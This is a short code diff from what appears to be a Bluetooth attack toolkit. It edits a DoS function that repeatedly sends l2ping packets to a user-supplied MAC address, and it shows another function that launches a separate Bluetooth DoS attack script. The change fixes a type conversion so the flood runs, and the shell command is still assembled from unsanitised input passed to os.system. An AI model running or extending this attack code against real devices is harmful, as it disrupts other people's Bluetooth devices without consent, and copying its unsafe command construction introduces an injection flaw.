@@ -65,7 +65,7 @@ def blueborne():
 def DoS(seq, size):
     mac = input("Write target MAC address: ")
     subprocess.run(["sudo", "seq " + str(seq), ">", "numberofpings"], stdout=subprocess.DEVNULL)
-    os.system("while read r; do l2ping -s " + size + " " + mac + "; done < numberofpings")
+    os.system("while read r; do l2ping -s " + str(size) + " " + mac + "; done < numberofpings")
 
 def jieggi_DoS():
     os.system("sudo python3 ./BLUETOOTH-DOS-ATTACK.py")
